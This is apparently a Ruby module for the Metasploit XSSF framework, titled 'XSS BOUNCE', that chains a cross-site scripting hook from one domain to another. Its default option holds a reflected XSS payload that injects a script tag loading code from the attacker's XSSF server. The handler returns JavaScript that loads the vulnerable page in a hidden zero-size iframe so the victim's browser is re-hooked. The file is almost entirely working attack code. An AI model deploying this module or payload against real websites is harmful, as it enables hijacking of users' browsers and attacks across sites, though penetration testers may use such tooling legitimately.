require 'msf/core'
require 'msf/base/xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer

	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'XSS BOUNCE',
			'Description' => 'Module permiting an XSS to bounce over an other XSS of other domain'
		))

		register_options(
			[
				OptString.new('vulnPage', [true, "Targeted vulnerable webpage (including all host path), including generic XSSF attack", 'http://localhost/?lang=en"<script src="http://XSSF_SRV:XSSF_PORT/loop?interval=5"></script>']),
			], self.class
		)
	end
	
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %{
			clearInterval(XSSF_LOOP);		// Kills the first loop
			
			iframe = XSSF_CREATE_IFRAME("XSS_BOUNCE", 0, 0);
			iframe.style.border = "none";
			iframe.src = '#{datastore['vulnPage']}'
			document.body.appendChild(iframe);	
		}
		send_response(cli, code)
	end
end